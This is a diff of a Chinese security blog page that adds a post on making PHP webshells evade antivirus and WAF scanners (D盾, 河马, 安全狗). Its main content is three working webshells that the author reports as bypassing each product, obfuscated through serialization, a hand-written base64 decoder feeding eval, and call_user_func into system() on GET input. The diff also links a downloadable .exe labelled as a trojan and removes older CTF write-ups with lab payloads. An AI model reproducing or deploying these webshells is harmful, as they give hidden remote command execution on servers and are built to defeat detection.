@@ -145,6 +145,116 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://silver-glacier.github.io/2022/09/11/PHP%E5%85%8D%E6%9D%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Glacier">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Glacier's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/09/11/PHP%E5%85%8D%E6%9D%80/" class="post-title-link" itemprop="url">PHP免杀</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-09-11 17:50:12 / Modified: 19:14:52" itemprop="dateCreated datePublished" datetime="2022-09-11T17:50:12+08:00">2022-09-11</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h1><p>免杀就是制作开发的病毒木马（脚本或者二进制）不被杀毒软件检测出。</p>
+<h2 id="免杀思路"><a href="#免杀思路" class="headerlink" title="免杀思路"></a>免杀思路</h2><p>分析杀软（WAF）,为什么杀你制作的病毒木马,是规则匹配引擎，是机器学习引擎，等等。只有你知道WAF为什么查杀你，你才知道如何绕过，达到免杀效果。</p>
+<h2 id="免杀过程"><a href="#免杀过程" class="headerlink" title="免杀过程"></a>免杀过程</h2><ol>
+<li>定位关键点</li>
+<li>分析关键点</li>
+<li>混淆关键点</li>
+</ol>
+<h2 id="杀软类型"><a href="#杀软类型" class="headerlink" title="杀软类型"></a>杀软类型</h2><ol>
+<li>本地杀软</li>
+<li>云端杀软</li>
+<li>二进制杀软</li>
+<li>脚本杀软</li>
+</ol>
+<h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h2><ol>
+<li>工具免杀</li>
+<li>代码膨胀（增加代码量）</li>
+<li>多层函数嵌套</li>
+</ol>
+<h3 id="本地杀软"><a href="#本地杀软" class="headerlink" title="本地杀软"></a>本地杀软</h3><p>本地杀软主要是绕过火绒，安全狗，D盾，河马等，而本地杀软对比起其他方式，对于攻击者来说是最友好的，因为本地杀软100%可以确定能不能绕过，只有两个结果，清楚明确，不需要猜测。</p>
+<h4 id="测试免杀D盾"><a href="#测试免杀D盾" class="headerlink" title="测试免杀D盾"></a>测试免杀D盾</h4><p>首先写最简单的一句话木马试试</p>
+<p><img src="https://s2.loli.net/2022/09/11/dXptJhWv5Zf7V8B.png" alt="D盾成功拦截"></p>
+<p>再试试我们常用方法中的代码膨胀，主要是向其注入足够的垃圾数据，来绕过本地杀软软件</p>
+<p><img src="https://s2.loli.net/2022/09/11/N6du4mY2nLStMJq.png" alt="代码膨胀免杀失败"></p>
+<p>按照我们的免杀过程，我们先定位关键点，先判断是否过滤了system函数</p>
+<p><img src="https://s2.loli.net/2022/09/11/2zX7mR6Ww1tHQvA.png" alt="system($a);被查杀"><br><img src="https://s2.loli.net/2022/09/11/GeWxXS5IluTyo6m.png" alt="system();函数能够正常使用"></p>
+<p>因此判断，D盾会检查system函数中的参数，来判断其安全性</p>
+<p>依然是过滤参数，我们先试一下用class是否能绕过<br><img src="https://s2.loli.net/2022/09/11/dYfAHs18LGwS9kQ.png" alt="使用class免杀失败"></p>
+<p>还是被查杀了，既然都想到用类了，那就再序列化试一下<br><img src="https://s2.loli.net/2022/09/11/EZmcxgUQ3nAGTpr.png" alt="序列化免杀成功"></p>
+<p>经过序列化之后，我们成功绕过了，但这样是无法成功执行的，我们只需要截取序列化中的关键词出来就行<br><img src="https://s2.loli.net/2022/09/11/4sHpu1UyRfSXk8a.png" alt="免杀成功"><br><img src="https://s2.loli.net/2022/09/11/GODHnIyg2615dqS.png" alt="命令执行成功"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$cmd</span> = <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getC</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> C;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$l</span> = <span class="variable">$_GET</span>[<span class="string">&quot;l&quot;</span>];</span><br><span class="line">	system(substr(serialize(getC()),<span class="number">26</span>,<span class="variable">$l</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test(<span class="string">&quot;aa&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="测试免杀河马"><a href="#测试免杀河马" class="headerlink" title="测试免杀河马"></a>测试免杀河马</h4><p>我们先尝试用之前成功免杀D盾的代码来测试一下河马</p>
+<p><img src="https://s2.loli.net/2022/09/11/MIo57bqju1CESeT.png" alt="被河马查杀"><br>能绕过D盾的代码直接被河马查杀了</p>
+<p>还是按照上面的思路，我们先定位关键点<br><img src="https://s2.loli.net/2022/09/11/dE8Bq1hpwFkLYi6.png"><br>发现河马直接过滤掉了system()，无论是否带有参数都直接查杀，挺狗的<br>接着尝试，发现eval()函数可以使用，但用eval()函数去调用system()也会被查杀<br>用编码绕过试一下</p>
+<p>将<code>system(calc);</code>base64编码得到<code>c3lzdGVtKCdjbGFjJyk7</code><br><img src="https://s2.loli.net/2022/09/11/I9WHr7kjJp3c2CY.png" alt="被河马查杀"></p>
+<p>仍然不能绕过，貌似会检测到base64_decode函数，网上找一个手写的脚本，改个函数名试试</p>
+<p><img src="https://s2.loli.net/2022/09/11/iq5KD4AWtwXpIdx.png" alt="还是被查杀"><br>好怪啊，怎么这样还是被查杀，莫非是河马自己后台用php跑一遍测试，或者是跟随了你的代码执行顺序逐句查杀</p>
+<p><img src="https://s2.loli.net/2022/09/11/VLxrkvyQon2WEp3.png"><br>不是吧，这样还是被查杀了，按照代码执行顺序也不对呀</p>
+<p>再反复测试，反复调试了一个下午，最后发现</p>
+<blockquote>
+<p>查杀了注释！！！</p>
+</blockquote>
+<p><img src="https://s2.loli.net/2022/09/11/pKB6mNe7t5Ab24C.png" alt="成功免杀"><br>这次终于对了，删掉了注释，按照代码执行顺序，执行不到eval()函数，成功绕过了河马<br>那我们接下来只需要让它无法判断是否该执行if条件中的语句，就能成功绕过</p>
+<p><img src="https://s2.loli.net/2022/09/11/M9w2AGPfQbXkSLt.png" alt="成功执行命令"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Glacier</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$keyStr</span> = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span>;</span><br><span class="line">	<span class="variable">$chr1</span> = <span class="variable">$chr2</span> = <span class="variable">$chr3</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="variable">$enc1</span> = <span class="variable">$enc2</span> = <span class="variable">$enc3</span> = <span class="variable">$enc4</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">	<span class="variable">$output</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$input</span> = preg_replace(<span class="string">&quot;[^A-Za-z0-9\+\/\=]&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$input</span>);</span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="variable">$enc1</span> = strpos(<span class="variable">$keyStr</span>, substr(<span class="variable">$input</span>, <span class="variable">$i</span>++, <span class="number">1</span>));</span><br><span class="line">		<span class="variable">$enc2</span> = strpos(<span class="variable">$keyStr</span>, substr(<span class="variable">$input</span>, <span class="variable">$i</span>++, <span class="number">1</span>));</span><br><span class="line">		<span class="variable">$enc3</span> = strpos(<span class="variable">$keyStr</span>, substr(<span class="variable">$input</span>, <span class="variable">$i</span>++, <span class="number">1</span>));</span><br><span class="line">		<span class="variable">$enc4</span> = strpos(<span class="variable">$keyStr</span>, substr(<span class="variable">$input</span>, <span class="variable">$i</span>++, <span class="number">1</span>));</span><br><span class="line">		<span class="variable">$chr1</span> = (<span class="variable">$enc1</span> &lt;&lt; <span class="number">2</span>) | (<span class="variable">$enc2</span> &gt;&gt; <span class="number">4</span>);</span><br><span class="line">		<span class="variable">$chr2</span> = ((<span class="variable">$enc2</span> &amp; <span class="number">15</span>) &lt;&lt; <span class="number">4</span>) | (<span class="variable">$enc3</span> &gt;&gt; <span class="number">2</span>);</span><br><span class="line">		<span class="variable">$chr3</span> = ((<span class="variable">$enc3</span> &amp; <span class="number">3</span>) &lt;&lt; <span class="number">6</span>) | <span class="variable">$enc4</span>;</span><br><span class="line">		<span class="variable">$output</span> = <span class="variable">$output</span> . chr((<span class="keyword">int</span>) <span class="variable">$chr1</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$enc3</span> != <span class="number">64</span>) &#123;</span><br><span class="line">			<span class="variable">$output</span> = <span class="variable">$output</span> . chr((<span class="keyword">int</span>) <span class="variable">$chr2</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$enc4</span> != <span class="number">64</span>) &#123;</span><br><span class="line">			<span class="variable">$output</span> = <span class="variable">$output</span> . chr((<span class="keyword">int</span>) <span class="variable">$chr3</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$chr1</span> = <span class="variable">$chr2</span> = <span class="variable">$chr3</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="variable">$enc1</span> = <span class="variable">$enc2</span> = <span class="variable">$enc3</span> = <span class="variable">$enc4</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="variable">$i</span> &lt; strlen(<span class="variable">$input</span>));</span><br><span class="line">	<span class="keyword">return</span> urldecode(<span class="variable">$output</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = Glacier(<span class="string">&quot;c3lzdGVtKCdjYWxjJyk7&quot;</span>); </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>] &gt; <span class="variable">$_GET</span>[<span class="string">&quot;b&quot;</span>])&#123;</span><br><span class="line">	<span class="keyword">eval</span>(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的函数是用的网上别人手写的base64，其实也可以直接用php库中的其他编码形式来绕过河马。</p>
+<h4 id="测试免杀safedog"><a href="#测试免杀safedog" class="headerlink" title="测试免杀safedog"></a>测试免杀safedog</h4><p>使用绕过河马的exp会被safedog拦截，测试发现其是逻辑过滤了eval的参数，那我们换个php的原生函数试一试</p>
+<p>这里的分析过程与上面类似，我们使用了php的原生函数<code>call_user_fnuc(&quot;aa&quot;,$_GET[&quot;a&quot;])</code><br>这里直接贴上exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aa</span> (<span class="params"><span class="variable">$cc</span></span>)</span>&#123;</span><br><span class="line">    system(<span class="variable">$cc</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(call_user_func(<span class="string">&quot;aa&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/09/11/nCNcuOeiJFK6vzG.png" alt="成功绕过安全狗"><br><img src="https://s2.loli.net/2022/09/11/h8XkPlDoswtg6fB.png" alt="命令执行成功"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://silver-glacier.github.io/2022/08/18/dll%E5%8A%AB%E6%8C%81%E4%B8%8EAheadLib/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -271,7 +381,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-08-18 17:58:50" itemprop="dateModified" datetime="2022-08-18T17:58:50+08:00">2022-08-18</time>
+                <time title="Modified: 2022-09-11 17:52:48" itemprop="dateModified" datetime="2022-09-11T17:52:48+08:00">2022-09-11</time>
               </span>
 
           
@@ -676,7 +786,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-06-19 17:04:50" itemprop="dateModified" datetime="2022-06-19T17:04:50+08:00">2022-06-19</time>
+                <time title="Modified: 2022-09-11 19:16:25" itemprop="dateModified" datetime="2022-09-11T19:16:25+08:00">2022-09-11</time>
               </span>
 
           
@@ -690,7 +800,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p><img src="/files/Welcome.jpg" alt="Welcome to my blog"><br><a target="_blank" rel="noopener" href="http://92t35s.ceye.io/">千万别点</a><br><a href="/files/1111.exe">试试这个</a></p>
+          <p><img src="/files/Welcome.jpg" alt="Welcome to my blog"><br><a href="/files/1111.exe">这是个🐎</a></p>
 
       
     </div>
@@ -710,7 +820,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://silver-glacier.github.io/2021/02/12/RoarCTF2019-EasyJava/">
+    <link itemprop="mainEntityOfPage" href="https://silver-glacier.github.io/2020/12/17/The%20first%20try/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -724,77 +834,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/02/12/RoarCTF2019-EasyJava/" class="post-title-link" itemprop="url">RoarCTF2019-EasyJava</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2021-02-12 20:08:49 / Modified: 20:15:33" itemprop="dateCreated datePublished" datetime="2021-02-12T20:08:49+08:00">2021-02-12</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="RoarCTF2019-Easy-Java"><a href="#RoarCTF2019-Easy-Java" class="headerlink" title="RoarCTF2019 Easy Java"></a>RoarCTF2019 Easy Java</h1><p>首先打开题目<br><img src="https://i.loli.net/2021/02/12/gf1aFj5vrkZ9oHm.png"><br>试一下sql注入，好像不行</p>
-<p><img src="https://i.loli.net/2021/02/12/Dh5LEzUCV62xsnG.png" alt="无论注入什么都是这个结果"></p>
-<p>login下面有一个help，点开看一下<br><img src="https://i.loli.net/2021/02/12/FCrg82TzKhjQNe4.png"><br>抓包看一下吧<br>把GET改成POST<br>加上filename<br><img src="https://i.loli.net/2021/02/12/Jxy5GFaAdlEsKuh.png"></p>
-<p>学习的新知识：</p>
-<blockquote>
-<p>WEB-INF主要包含一下文件或目录:<br>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中<br>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。<br>/WEB-INF/database.properties：数据库配置文件<br>漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</p>
-</blockquote>
-<p>写出payload<br><img src="https://i.loli.net/2021/02/12/pEGKV9Ax3Cw1PLR.png"></p>
-<p>下载下来一个class文件<br>里面有一个类似于base64加密的东西，解码出来<br><img src="https://i.loli.net/2021/02/12/bXrPm3oVJESUvac.png"></p>
-<blockquote>
-<p>得到flag！</p>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://silver-glacier.github.io/2021/02/07/MRCTF-Ez-bypass/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Glacier">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Glacier's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/02/07/MRCTF-Ez-bypass/" class="post-title-link" itemprop="url">MRCTF-Ez_bypass</a>
+            <a href="/2020/12/17/The%20first%20try/" class="post-title-link" itemprop="url">The first try</a>
         </h2>
 
         <div class="post-meta">
@@ -804,14 +844,14 @@
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              <time title="Created: 2021-02-07 11:04:05" itemprop="dateCreated datePublished" datetime="2021-02-07T11:04:05+08:00">2021-02-07</time>
+              <time title="Created: 2020-12-17 08:49:24" itemprop="dateCreated datePublished" datetime="2020-12-17T08:49:24+08:00">2020-12-17</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-02-08 11:10:16" itemprop="dateModified" datetime="2021-02-08T11:10:16+08:00">2021-02-08</time>
+                <time title="Modified: 2020-12-19 13:02:41" itemprop="dateModified" datetime="2020-12-19T13:02:41+08:00">2020-12-19</time>
               </span>
 
           
@@ -825,22 +865,37 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="MRCTF-Ez-bypass"><a href="#MRCTF-Ez-bypass" class="headerlink" title="MRCTF Ez_bypass"></a>MRCTF Ez_bypass</h1><p>首先打开题目<br><img src="https://i.loli.net/2021/02/08/PAFWiylpORLZ68q.png"><br>直接看源码吧，这样看确实很乱</p>
-<p><img src="https://i.loli.net/2021/02/08/XsuxQV61cp5hKqA.png" alt="这样看就舒服多了"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$gg</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5(<span class="variable">$id</span>) === md5(<span class="variable">$gg</span>) &amp;&amp; <span class="variable">$id</span> !== <span class="variable">$gg</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric(<span class="variable">$passwd</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>(<span class="variable">$passwd</span>==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>首先看到这一句</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (md5(<span class="variable">$id</span>) === md5(<span class="variable">$gg</span>) &amp;&amp; <span class="variable">$id</span> !== <span class="variable">$gg</span>)</span><br></pre></td></tr></table></figure>
-<p>要求md5加密过后的内容相等，注意这里是php的强比较，而不是弱比较，但是又要本身的值不相等<br>查了一下，把他写成数组就好了，因为md5加密无法处理数组，任何数组的返回值都将是null<br>那这样的话就直接</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id[]=<span class="number">1</span>&amp;gg[]=<span class="number">2</span></span><br></pre></td></tr></table></figure>
-
-<p>这样就越过了第一个if了<br>然后再用hackbar传上去<br><img src="https://i.loli.net/2021/02/08/wGOhcUqKHjMWyQr.png"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!is_numeric(<span class="variable">$passwd</span>))</span><br></pre></td></tr></table></figure>
-<p>这个数字的检测，很简单，passwd=1234567a就好了</p>
-<p>再把他POST上去<br><img src="https://i.loli.net/2021/02/08/3HgFAWONIpEyGh4.png"></p>
-<blockquote>
-<p>得到flag！</p>
+          <h1 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h1><blockquote>
+<p>引用</p>
 </blockquote>
+<hr>
+<p><em>斜体</em><br><strong>加粗</strong></p>
+<p>！<a href="%E5%9B%BE%E7%89%87%E9%93%BE%E6%8E%A5">说明</a></p>
+<p><a target="_blank" rel="noopener" href="http://baidu.com/">百度</a></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i=<span class="string">&quot;代码块&quot;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>列表</li>
+<li>列表</li>
+</ul>
+<ol>
+<li>列表</li>
+<li>列表</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th align="center">表头</th>
+<th align="left">表头</th>
+<th align="right">表头</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">1</td>
+<td align="left">2</td>
+<td align="right">3</td>
+</tr>
+</tbody></table>
+<p><del>删除</del></p>
 
       
     </div>
@@ -860,7 +915,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://silver-glacier.github.io/2021/02/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019hard-sql/">
+    <link itemprop="mainEntityOfPage" href="https://silver-glacier.github.io/2020/12/16/hello-world/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -874,7 +929,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/02/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019hard-sql/" class="post-title-link" itemprop="url">极客大挑战2019hard_sql</a>
+            <a href="/2020/12/16/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
         </h2>
 
         <div class="post-meta">
@@ -884,14 +939,14 @@
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              <time title="Created: 2021-02-06 11:15:08" itemprop="dateCreated datePublished" datetime="2021-02-06T11:15:08+08:00">2021-02-06</time>
+              <time title="Created: 2020-12-16 20:21:11" itemprop="dateCreated datePublished" datetime="2020-12-16T20:21:11+08:00">2020-12-16</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-02-07 11:21:39" itemprop="dateModified" datetime="2021-02-07T11:21:39+08:00">2021-02-07</time>
+                <time title="Modified: 2020-12-17 08:25:47" itemprop="dateModified" datetime="2020-12-17T08:25:47+08:00">2020-12-17</time>
               </span>
 
           
@@ -905,15 +960,19 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="极客大挑战2019hard-sql"><a href="#极客大挑战2019hard-sql" class="headerlink" title="极客大挑战2019hard sql"></a>极客大挑战2019hard sql</h1><p>首先打开题目，先判断一下是什么注入，但是过滤掉了很多东西，这次新学会了一个操作，用字典去爆破sql，来看它过滤掉了哪些<br><img src="https://i.loli.net/2021/02/07/wVvT2d4Cbynqjg6.png"><br>这个过滤掉了很多，那么就可能是报错注入了，因为它好像没有过滤掉updatexml</p>
